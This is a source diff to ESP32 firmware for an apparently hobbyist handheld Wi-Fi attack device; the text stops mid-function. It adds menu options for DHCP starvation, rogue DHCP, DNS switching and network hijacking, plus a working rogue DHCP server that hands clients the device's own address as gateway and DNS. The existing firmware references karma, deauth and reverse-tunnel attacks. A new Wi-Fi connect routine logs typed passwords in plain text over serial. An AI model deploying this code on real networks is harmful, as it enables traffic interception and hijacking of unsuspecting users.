@@ -29,6 +29,7 @@
    regarding network testing and ethical hacking.
 */
 // remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
+// Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
 #include <SPI.h>
 #include <XPT2046_Bitbang.h>  // Use this library for software SPI
 #include <TFT_eSPI.h>
@@ -138,20 +139,12 @@ extern "C" {
 #include "esp_system.h"
 }
 
-#include <vector>
-#include <string>
 #include <set>
 #include <TinyGPS++.h>
 #include <Adafruit_NeoPixel.h> //led
 #include <ArduinoJson.h>
-#include <vector>
 
 
-
-extern "C" {
-#include "esp_wifi.h"
-#include "esp_system.h"
-}
 
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_5;
 
@@ -160,6 +153,9 @@ bool randomOn = false;
 
 WebServer server(80);
 DNSServer dnsServer;
+IPAddress ipAP;    // Adresse IP du mode AP
+IPAddress ipSTA;   // Adresse IP du mode STA
+bool useAP = true; // Alterner entre AP et STA
 const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
@@ -198,9 +194,17 @@ const char* menuItems[] = {
   "Handshake/Deauth Sniffing",
   "Check Handshakes",
   "Wall Of Flipper",
+  "Connect to network",
   "PwnGrid Spam",
   "Skimmer Detector",
   "Reverse TCP Tunnel",
+  "DHCP Starvation",
+  "Rogue DHCP",
+  "Switch DNS",
+  "Network Hijacking",
+  "Detect Printer",
+  "File Print",
+  "Check printer status",
   "Settings",
 };
 
@@ -220,8 +224,8 @@ int topVisibleIndex = 0;
 // Connect to nearby wifi network automaticaly to provide internet to the cardputer you can be connected and provide AP at same time
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
-const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
-const char* password = ""; // wifi password
+String ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
+String password = ""; // wifi password
 
 
 //!!!!!! CHANGE THIS !!!!!
@@ -763,7 +767,7 @@ void setup() {
   if (randomOn) {
     String randomImage = getRandomImage();  // Sélectionner une image aléatoire
 
-    drawJpg(randomImage.c_str(),0,0);
+    drawJpg(randomImage.c_str(), 0, 0);
     if (ledOn) {
       pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
       pixels.show();
@@ -771,7 +775,7 @@ void setup() {
     delay(2000);
   } else {
     // Comportement par défaut
-    drawJpg(selectedStartupImage.c_str(),0,0);
+    drawJpg(selectedStartupImage.c_str(), 0, 0);
     if (ledOn) {
       pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
       pixels.show();
@@ -831,7 +835,7 @@ void setup() {
     delay(50);
   }
 
-  if (strcmp(ssid, "") != 0) {
+  if (ssid != "") {
     WiFi.mode(WIFI_MODE_APSTA);
     WiFi.begin(ssid, password);
 
@@ -1187,17 +1191,40 @@ void executeMenuItem(int index) {
       wallOfFlipper();
       break;
     case 32:
-      send_pwnagotchi_beacon_main();
+      connectWifi(currentListIndex);
       break;
     case 33:
-      skimmerDetection();
+      send_pwnagotchi_beacon_main();
       break;
     case 34:
-      reverseTCPTunnel();
+      skimmerDetection();
       break;
     case 35:
-      showSettingsMenu();
+      reverseTCPTunnel();
       break;
+    case 36:
+      startDHCPStarvation();
+      break;
+    case 37:
+      rogueDHCP();
+      break;
+    case 38:
+      switchDNS();
+      break;
+    case 39:
+      DHCPAttackAuto();
+      break;
+    case 40:
+      detectPrinter();
+      break;
+    case 41:
+      printFile();
+      break;
+    case 42:
+      checkPrinterStatus();
+      break;
+    case 43:
+      showSettingsMenu();
   }
   isOperationInProgress = false;
 }
@@ -1440,9 +1467,9 @@ void changePortal(int index) {
       for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
         if (i == portalFileIndex) {
           tft.fillRect(0, (i - listStartIndex) * 18, tft.width(), 18, menuSelectedBackgroundColor);
-          tft.setTextColor(menuTextFocusedColor,menuSelectedBackgroundColor);
+          tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
         } else {
-          tft.setTextColor(menuTextUnFocusedColor,menuBackgroundColor);
+          tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         }
         tft.setCursor(10, (i - listStartIndex) * 18);
         tft.println(portalFiles[i].substring(7));
@@ -1541,9 +1568,9 @@ void showWifiList() {
   for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit); i++) {
     if (i == currentListIndex) {
       tft.fillRect(0, (i - listStartIndex) * 18, tft.width(), 18, menuSelectedBackgroundColor);
-      tft.setTextColor(menuTextFocusedColor,menuSelectedBackgroundColor);
+      tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
     } else {
-      tft.setTextColor(menuTextUnFocusedColor,menuBackgroundColor);
+      tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     }
     tft.setCursor(10, (i - listStartIndex) * 18);
     tft.println(ssidList[i]);
@@ -3311,19 +3338,25 @@ void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options,
   }
 }
 
-void showSettingsMenu() { 
-    std::vector<std::pair<String, std::function<void()>>> options; 
+void showSettingsMenu() {
+  std::vector<std::pair<String, std::function<void()>>> options;
 
-    bool continueSettingsMenu = true;
+  bool continueSettingsMenu = true;
 
-    while (continueSettingsMenu) {
-        options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement
+  while (continueSettingsMenu) {
+    options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement
 
-        options.push_back({"Brightness", brightness}); 
-        options.push_back({ledOn ? "LED Off" : "LED On", []() {toggleLED();}});
-        options.push_back({"Set Startup Image", setStartupImage}); 
-        options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
-        loopOptions(options, false, true, "Settings");
+    options.push_back({"Brightness", brightness});
+    options.push_back({ledOn ? "LED Off" : "LED On", []() {
+      toggleLED();
+    }
+                      });
+    options.push_back({"Set Startup Image", setStartupImage});
+    options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {
+      toggleRandom();
+    }
+                      });
+    loopOptions(options, false, true, "Settings");
 
     // Détection de l'écran tactile pour quitter le menu des paramètres
     TouchPoint touch = ts.getTouch();
@@ -3497,7 +3530,7 @@ void setStartupImage() {
       if (needDisplayUpdate) {
         tft.fillScreen(menuBackgroundColor);
         String ThisImg = "/img/" + images[currentImageIndex];
-        drawJpg(ThisImg.c_str(),0,0);
+        drawJpg(ThisImg.c_str(), 0, 0);
         needDisplayUpdate = false;
       }
     }
@@ -3537,7 +3570,7 @@ void setStartupImage() {
           selectedStartupImage = images[currentImageIndex];
           saveStartupImageConfig(selectedStartupImage);
           String ThisImg = "/img/" + images[currentImageIndex];
-          drawJpg(ThisImg.c_str(),0,0);
+          drawJpg(ThisImg.c_str(), 0, 0);
           delay(1000);
           tft.fillScreen(menuBackgroundColor);
           tft.setTextColor(menuTextFocusedColor);
@@ -3702,11 +3735,11 @@ void restoreConfigParameter(String key) {
           } else if (key == "selectedTheme") {
             selectedTheme = stringValue;
             Serial.println("Selected Theme restored to " + stringValue);
-          } else if (key == "wifi_ssid" && strlen(ssid) == 0) {
+          } else if (key == "wifi_ssid" && ssid.length() == 0) {
             stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
             ssid = ssid_buffer;
             Serial.println("WiFi SSID restored to " + stringValue);
-          } else if (key == "wifi_password" && strlen(password) == 0) {
+          } else if (key == "wifi_password" && password.length() == 0) {
             stringValue.toCharArray(password_buffer, sizeof(password_buffer));
             password = password_buffer;
             Serial.println("WiFi Password restored ");
@@ -3740,7 +3773,7 @@ void restoreConfigParameter(String key) {
       if (!keyFound) {
         Serial.println("Key not found in config, using default for " + key);
         if (key == "brightness") {
-      ledcAnalogWrite(LEDC_CHANNEL_0, defaultBrightness);
+          ledcAnalogWrite(LEDC_CHANNEL_0, defaultBrightness);
         } else if (key == "ledOn") {
           boolValue = false;  // Default to LED off
         } else if (key == "randomOn") {
@@ -4185,13 +4218,12 @@ void handleMenuInputKarma() {
   }
 }
 
-
 void drawMenuKarma() {
   tft.fillScreen(TFT_BLACK);
-  tft.setTextSize(2);
   tft.setTextFont(1);
+  tft.setTextSize(2);
 
-  int lineHeight = 12;
+  int lineHeight = 16;
   int startX = 0;
   int startY = 6;
 
@@ -4199,16 +4231,20 @@ void drawMenuKarma() {
     int menuIndexKarma = menuStartIndexKarma + i;
     if (menuIndexKarma >= menuSizeKarma) break;
 
+    int posY = startY + i * lineHeight;
+
     if (menuIndexKarma == currentIndexKarma) {
-      tft.fillRect(0, i * lineHeight, tft.width(), lineHeight, menuSelectedBackgroundColor);
-      tft.setTextColor(menuTextFocusedColor);
+      tft.fillRect(0, posY, tft.width(), lineHeight, menuSelectedBackgroundColor);
+      tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
     } else {
-      tft.setTextColor(menuTextUnFocusedColor);
+      tft.fillRect(0, posY, tft.width(), lineHeight, TFT_BLACK);
+      tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     }
-    tft.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 11);
+
+    int offsetY = (lineHeight - 16) / 2;
+    tft.setCursor(startX, posY + offsetY);
     tft.println(ssidsKarma[menuIndexKarma]);
   }
-
 }
 
 void executeMenuItemKarma(int indexKarma) {
@@ -4246,18 +4282,42 @@ void startAPWithSSIDKarma(const char* ssid) {
     currentTime = millis();
     remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
     clientCount = WiFi.softAPgetStationNum();
-
-    // Affichage des informations
     tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-    tft.setCursor((tft.width() - 12 * strlen(ssid)) / 2, 25);
+    tft.setTextSize(2);
+
+    int screenHeight = 240;
+    int lineHeight = 16;
+    int margin = (screenHeight - (3 * lineHeight)) / 4;
+
+    int ssidY = margin;
+    int ssidX = (320 - tft.textWidth(ssid)) / 2;
+    tft.setCursor(ssidX, ssidY);
     tft.println(String(ssid));
-    tft.setCursor(10, 45);
-    tft.print("Left Time: ");
-    tft.print(remainingTime);
-    tft.println(" s");
-    tft.setCursor(10, 65);
-    tft.print("Connected Client: ");
-    tft.println(clientCount);
+
+    String timeText = "Left Time: " + String(remainingTime) + " s  ";
+    int timeTextY = ssidY + lineHeight + margin;
+    int timeTextX = (320 - tft.textWidth(timeText)) / 2;
+    tft.setCursor(timeTextX, timeTextY);
+    tft.println(timeText);
+
+    String clientText = "Connected Client: " + String(clientCount);
+    int clientTextY = timeTextY + lineHeight + margin;
+    int clientTextX = (320 - tft.textWidth(clientText)) / 2;
+    tft.setCursor(clientTextX, clientTextY);
+    tft.println(clientText);
+
+    // Dimensions du bouton
+    int buttonWidth = 80;  // Largeur du bouton
+    int buttonHeight = 30; // Hauteur du bouton
+    int buttonX = (320 - buttonWidth) / 2; // Centrage horizontal
+    int buttonY = 240 - buttonHeight - 10; // Positionné 10 pixels au-dessus du bord inférieur
+
+    // Dessiner le bouton Stop
+    tft.fillRoundRect(buttonX, buttonY, buttonWidth, buttonHeight, 5, TFT_RED); // Bouton rouge avec coins arrondis
+    tft.setTextColor(TFT_WHITE, TFT_RED); // Texte blanc sur fond rouge
+    tft.setCursor(buttonX + (buttonWidth - tft.textWidth("STOP")) / 2, buttonY + (buttonHeight - 16) / 2);
+    tft.println("STOP");
+
 
     // Logs sur le port série
     Serial.println("---Karma-Attack---");
@@ -4265,11 +4325,6 @@ void startAPWithSSIDKarma(const char* ssid) {
     Serial.println("Left Time: " + String(remainingTime) + "s");
     Serial.println("Connected Client: " + String(clientCount));
     Serial.println("-------------------");
-
-    // Affichage du bouton Stop
-    tft.setTextColor(menuTextUnFocusedColor);
-    tft.setCursor(33, 110);
-    tft.println(" Stop");
 
 
     // Détection tactile pour arrêter
@@ -4290,6 +4345,7 @@ void startAPWithSSIDKarma(const char* ssid) {
     }
     delay(200);
   }
+  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   // Résultat après arrêt ou fin de la durée
   tft.fillScreen(TFT_BLACK);
@@ -5183,7 +5239,8 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
   if (!isInitialDisplayDone) {
     tft.fillScreen(menuBackgroundColor);  // Effacer l'écran avec la couleur de fond
-    tft.setTextColor(menuTextUnFocusedColor);
+    tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+
 
     // Affichage du SSID
     tft.setCursor(0, 10);
@@ -5196,6 +5253,10 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
     tft.print("Connected Client: ");
 
     // Affichage du bouton "Stop" en bas
+    tft.setCursor(tft.width() / 2 - 20, tft.height() - 70);
+    tft.println("Next");
+    
+    // Affichage du bouton "Stop" en bas
     tft.setCursor(tft.width() / 2 - 20, tft.height() - 20);
     tft.println("Stop");
 
@@ -5205,11 +5266,10 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   // Mise à jour de la valeur du temps restant
   int timeValuePosX = tft.textWidth("Left Time: ");
   int timeValuePosY = 30;
-  tft.fillRect(timeValuePosX, 20 , 25, 20, menuBackgroundColor);
-  tft.setTextColor(menuTextUnFocusedColor);
+  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   tft.setCursor(timeValuePosX, timeValuePosY);
   tft.print(remainingTime);
-  tft.print(" s ");
+  tft.print(" s  ");
 
   // Mise à jour du nombre de clients connectés
   int clientValuePosX = tft.textWidth("Connected Client: ");
@@ -5280,7 +5340,7 @@ void wardrivingMode() {
 
   // Configuration de l'écran
   tft.fillScreen(menuBackgroundColor);
-  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
   tft.setTextSize(2);
   tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
   tft.setCursor(tft.width() / 2 - 24, tft.height() - 20);
@@ -5594,7 +5654,6 @@ int nthIndexOf(const String & str, char toFind, int nth) {
 }
 
 
-
 void karmaSpear() {
   isAutoKarmaActive = true;
   createCaptivePortal();
@@ -5610,7 +5669,11 @@ void karmaSpear() {
     waitAndReturnToMenu(" KarmaFile empty.");
     return;
   }
-  while (karmaListFile.available()) {
+
+  bool stopRequested = false; // Drapeau pour arrêter la boucle
+  
+  while (karmaListFile.available() && !stopRequested) {
+    
     String ssid = karmaListFile.readStringUntil('\n');
     ssid.trim();
 
@@ -5618,18 +5681,27 @@ void karmaSpear() {
       activateAPForAutoKarma(ssid.c_str());
       Serial.println("Created Karma AP for SSID: " + ssid);
       displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
+
+      // Vérification de succès
       if (karmaSuccess) {
         waitAndReturnToMenu("return to menu");
         return;
       }
-      delay(200);
     }
   }
+
   karmaListFile.close();
   isAutoKarmaActive = false;
-  Serial.println("Karma Spear Failed...");
-  waitAndReturnToMenu("Karma Spear Failed...");
+
+  if (stopRequested) {
+    Serial.println("Karma Spear stopped by user.");
+    waitAndReturnToMenu("Karma Spear stopped.");
+  } else {
+    Serial.println("Karma Spear Failed...");
+    waitAndReturnToMenu("Karma Spear Failed...");
+  }
 }
+
 
 
 
@@ -6014,16 +6086,6 @@ void setDeviceMacAddress(String mac) {
 
 
 // Set wifi and password ssid end
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -8327,12 +8389,106 @@ void wallOfFlipper() {
 
 
 
+// Fonction pour se connecter au Wi-Fi
+bool connectToWiFi(const String& ssid, const String& password) {
+  WiFi.begin(ssid.c_str(), password.c_str());
+
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 10);
+  tft.println("Connecting to WiFi...");
 
 
+  Serial.print("Connecting to SSID: ");
+  Serial.println(ssid);
 
+  int timeout = 10; // Timeout de 10 secondes pour la connexion
+  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
+    delay(1000);
+    timeout--;
+    Serial.print(".");
+  }
+  Serial.println();
 
+  if (WiFi.status() == WL_CONNECTED) {
+    Serial.println("WiFi connected successfully!");
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 10);
+    tft.println("Connected!");
+    tft.setCursor(0, 30);
+    tft.println("IP: " + WiFi.localIP().toString());
 
+    delay(2000); // Affiche le message pendant 2 secondes
+    return true;
+  } else {
+    Serial.println("Failed to connect to WiFi.");
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 10);
+    tft.println("Failed to connect.");
+    tft.setCursor(0, 30);
+    tft.println("Please try again.");
 
+    delay(2000); // Affiche le message pendant 2 secondes
+    return false;
+  }
+}
+// Fonction principale de connexion Wi-Fi
+void connectWifi(int networkIndex) {
+  Serial.println("Starting WiFi connection process...");
+  screenDebounce();
+  if (WiFi.localIP().toString() != "0.0.0.0") {
+    if (confirmPopup("You want to disconnect ?")) {
+      Serial.println("Disconnecting from current WiFi...");
+      WiFi.disconnect(true);
+      waitAndReturnToMenu("Disconnected");
+      return;
+    } else {
+      waitAndReturnToMenu("Stay connected...");
+      return;
+    }
+  }
+
+  String nameSSID = ssidList[networkIndex];
+  String typedPassword = "";
+
+  Serial.print("Selected network SSID: ");
+  Serial.println(nameSSID);
+
+  // Si le réseau est ouvert, passer directement à la connexion
+  if (getWifiSecurity(networkIndex) == "Open") {
+    Serial.println("Network is open, no password required.");
+    if (connectToWiFi(nameSSID, "")) {
+      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+      ssid = nameSSID; // Stocke le SSID sélectionné
+    } else {
+      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+    }
+    return;
+  }
+
+  // Demander le mot de passe pour les réseaux sécurisés
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 10);
+  tft.println("Enter Password for " + nameSSID);
+  delay(2000);
+
+  // Appel à la fonction getUserInput pour obtenir le mot de passe
+  typedPassword = getUserInput();
+
+  if (typedPassword.length() > 0) {
+    Serial.print("Attempting to connect to WiFi with password: ");
+    Serial.println(typedPassword);
+
+    if (connectToWiFi(nameSSID, typedPassword)) {
+      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+      ssid = nameSSID; // Stocke le SSID sélectionné
+      password = typedPassword;
+    } else {
+      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+    }
+  } else {
+    waitAndReturnToMenu("Password entry canceled.");
+  }
+}
 
 // pwngridspam
 
@@ -8776,6 +8932,92 @@ void skimmerDetection() {
 // detectskimmer end
 
 
+bool connectWithTimeout(WiFiClient& client, IPAddress ip, uint16_t port, uint32_t timeout_ms) {
+  int sock = socket(AF_INET, SOCK_STREAM, 0);
+  if (sock < 0) {
+    return false;
+  }
+
+  struct sockaddr_in server;
+  server.sin_family = AF_INET;
+  server.sin_port = htons(port);
+  server.sin_addr.s_addr = ip;
+
+  int flags = fcntl(sock, F_GETFL, 0);
+  fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
+  int res = connect(sock, (struct sockaddr*)&server, sizeof(server));
+  if (res < 0) {
+    if (errno != EINPROGRESS) {
+      close(sock);
+      return false;
+    }
+  }
+
+  fd_set fdset;
+  FD_ZERO(&fdset);
+  FD_SET(sock, &fdset);
+  struct timeval tv;
+  tv.tv_sec = timeout_ms / 1000;
+  tv.tv_usec = (timeout_ms % 1000) * 1000;
+
+  res = select(sock + 1, NULL, &fdset, NULL, &tv);
+  if (res <= 0) {
+    close(sock);
+    return false;
+  }
+
+  int so_error;
+  socklen_t len = sizeof(so_error);
+  getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+  if (so_error != 0) {
+    close(sock);
+    return false;
+  }
+
+  client = WiFiClient(sock);
+  return true;
+}
+
+void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults);
+
+void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults) {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+
+  int totalLines = scanResults.size();
+  int endLine = std::min(displayStart + maxLines, totalLines);
+
+  for (int i = displayStart; i < endLine; i++) {
+    tft.println(scanResults[i]); // Pas besoin de conversion
+  }
+}
+
+
+bool handleScrolling(int& displayStart, int maxLines, int totalLines) {
+  int previousDisplayStart = displayStart;
+
+  // Détection tactile pour le défilement
+  TouchPoint touch = ts.getTouch();
+  if (touch.zRaw != 0) {
+    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
+    int y = map(touch.yRaw, minY, maxY, 0, tft.height());
+
+    if (x < tft.width() / 3) {
+      // Zone de gauche - Défilement vers le haut
+      displayStart = max(0, displayStart - 1);
+      Serial.println("Scrolling up");
+      delay(30);
+    } else if (x > 2 * (tft.width() / 3)) {
+      // Zone de droite - Défilement vers le bas
+      displayStart = min(displayStart + 1, max(0, totalLines - maxLines));
+      Serial.println("Scrolling down");
+      delay(30);
+    }
+  }
+
+  return displayStart != previousDisplayStart;
+}
 
 
 bool isBackspacePressed() {
@@ -9508,4 +9750,1902 @@ void startWardivingMaster() {
   }
   // Exécuter les étapes de nettoyage une fois sortie de la boucle
   Serial.println("Exiting Wardriving Master mode...");
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#include <WiFiUdp.h>
+
+WiFiUDP udp;
+unsigned int localUdpPort = 67; // DHCP Port
+IPAddress rogueIPRogue;              // Use the IP address obtained by the ESP32
+
+IPAddress currentSubnetRogue;
+IPAddress currentGatewayRogue;
+IPAddress currentDNSRogue;
+uint8_t offeredIpSuffixRogue = 101; // IP suffix used for DHCP offer
+int cursorPositionRogue = 10;         // Initial cursor position
+const int maxLinesRogue = 10;         // Number of lines to display
+String displayLinesRogue[10];         // Array to store the last lines
+int currentLineRogue = 0;             // Index of the current line
+
+uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150};
+const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
+bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs
+
+#define MAX_CLIENTS 10
+struct ClientInfo {
+  uint8_t mac[6];
+  uint8_t ipSuffix;
+};
+
+ClientInfo clients[MAX_CLIENTS];
+
+void initClients() {
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    memset(clients[i].mac, 0, 6);
+    clients[i].ipSuffix = 0;
+  }
+}
+
+
+void rogueDHCP() {
+  rogueIPRogue = WiFi.localIP();
+  currentSubnetRogue = WiFi.subnetMask();
+  currentGatewayRogue = WiFi.localIP();
+  currentDNSRogue = WiFi.localIP();
+
+  initClients(); // Initialize client info
+
+  if (!udp.begin(localUdpPort)) {
+    Serial.println("Error: UDP port 67 start failed.");
+    tft.println("Error: UDP start failed.");
+    delay(2000);
+    stopCaptivePortal();
+    if (!udp.begin(localUdpPort)) {
+      Serial.println("Error: UDP port 67 start failed.");
+      waitAndReturnToMenu("Error: UDP start failed.");
+      return;
+    }
+  }
+
+  tft.fillScreen(menuBackgroundColor);
+  Serial.println("Rogue DHCP running...");
+  updateDisplay("DHCP running...");
+  screenDebounce();
+  while (true) {
+    TouchPoint touch = ts.getTouch();
+    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
+      Serial.println("Returning to menu.");
+      updateDisplay("Returning...");
+      waitAndReturnToMenu("Return to menu.");
+      break;
+    }
+    handleDnsRequestSerial();
+
+    int packetSizeRogue = udp.parsePacket();
+    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
+      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
+      updateDisplay("Packet received");
+
+      uint8_t packetBufferRogue[512];
+      udp.read(packetBufferRogue, packetSizeRogue);
+
+      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
+
+      if (messageTypeRogue == 1) { // DHCP Discover
+        Serial.println("DHCP Discover received. Preparing Offer...");
+        updateDisplay("Discover. Preparing Offer...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
+
+        // Send the DHCP Offer
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP Offer sent.");
+        updateDisplay("Offer sent.");
+
+      } else if (messageTypeRogue == 3) { // DHCP Request
+        Serial.println("DHCP Request received. Preparing ACK...");
+        updateDisplay("Request. Preparing ACK...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
+
+        // Send the DHCP ACK
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP ACK sent.");
+        updateDisplay("ACK sent.");
+      }
+    }
+  }
+}
+
+uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
+  // DHCP options start after 240 bytes
+  int optionsIndexRogue = 240;
+  while (optionsIndexRogue < packetSizeRogue) {
+    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
+    if (optionTypeRogue == 255) {
+      break; // End Option
+    } else if (optionTypeRogue == 0) {
+      continue; // Pad Option, skip
+    }
+    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
+    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
+    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
+    if (optionTypeRogue == 53 && optionLenRogue == 1) {
+      return packetRogue[optionsIndexRogue]; // Return the DHCP message type
+    }
+    optionsIndexRogue += optionLenRogue; // Skip to the next option
+  }
+  return 0; // Unknown message type
+}
+
+void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requestedIP, IPAddress &serverID) {
+  // DHCP options start after 240 bytes
+  int optionsIndexRogue = 240;
+  while (optionsIndexRogue < packetSizeRogue) {
+    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
+    if (optionTypeRogue == 255) {
+      break; // End Option
+    } else if (optionTypeRogue == 0) {
+      continue; // Pad Option, skip
+    }
+    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
+    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
+    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
+
+    if (optionTypeRogue == 50 && optionLenRogue == 4) {
+      // Requested IP Address
+      requestedIP = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
+    } else if (optionTypeRogue == 54 && optionLenRogue == 4) {
+      // Server Identifier
+      serverID = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
+    }
+    optionsIndexRogue += optionLenRogue; // Skip to the next option
+  }
+}
+
+void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue) {
+  // Set BOOTREPLY
+  packetRogue[0] = 2; // BOOTREPLY
+
+  // Extract client MAC address
+  uint8_t clientMac[6];
+  memcpy(clientMac, &packetRogue[28], 6);
+
+  // Variables to hold requested IP and server identifier
+  IPAddress requestedIP(0, 0, 0, 0);
+  IPAddress serverID(0, 0, 0, 0);
+
+  // Parse DHCP options to get requested IP and server identifier
+  parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);
+
+  uint8_t offeredIpSuffix = 0;
+
+  if (messageTypeRogue == 2) { // DHCP Offer
+    // Allocate an IP address for the client
+    offeredIpSuffix = allocateIpAddress(clientMac);
+    if (offeredIpSuffix == 0) {
+      Serial.println("No available IP addresses.");
+      updateDisplay("No available IPs.");
+      return;
+    }
+  } else if (messageTypeRogue == 5) { // DHCP ACK
+    // Client is requesting a specific IP
+    if (requestedIP != IPAddress(0, 0, 0, 0)) {
+      if (requestedIP[0] == rogueIPRogue[0] && requestedIP[1] == rogueIPRogue[1] && requestedIP[2] == rogueIPRogue[2]) {
+        // Check if requested IP is in our available IPs
+        uint8_t requestedSuffix = requestedIP[3];
+        // Check if requestedSuffix is in availableIpSuffixesRogue[]
+        bool ipAvailable = false;
+        for (int i = 0; i < numAvailableIps; i++) {
+          if (availableIpSuffixesRogue[i] == requestedSuffix) {
+            // Check if IP is already allocated
+            if (!ipAllocatedRogue[i]) {
+              // Allocate the IP to the client
+              ipAllocatedRogue[i] = true;
+              // Store the client info
+              for (int j = 0; j < MAX_CLIENTS; j++) {
+                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6) == 0) {
+                  memcpy(clients[j].mac, clientMac, 6);
+                  clients[j].ipSuffix = requestedSuffix;
+                  break;
+                }
+              }
+              offeredIpSuffix = requestedSuffix;
+              ipAvailable = true;
+              break;
+            } else {
+              // IP is already allocated
+              // Check if it's allocated to the same client
+              for (int j = 0; j < MAX_CLIENTS; j++) {
+                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6) == 0) {
+                  // IP is allocated to the same client
+                  offeredIpSuffix = requestedSuffix;
+                  ipAvailable = true;
+                  break;
+                }
+              }
+            }
+          }
+        }
+      }
+    } else {
+      // No requested IP, allocate IP
+      offeredIpSuffix = allocateIpAddress(clientMac);
+      if (offeredIpSuffix == 0) {
+        Serial.println("No available IP addresses.");
+        updateDisplay("No available IPs.");
+        return;
+      }
+    }
+  }
+
+  // Set your offered IP address (yiaddr)
+  packetRogue[16] = rogueIPRogue[0];
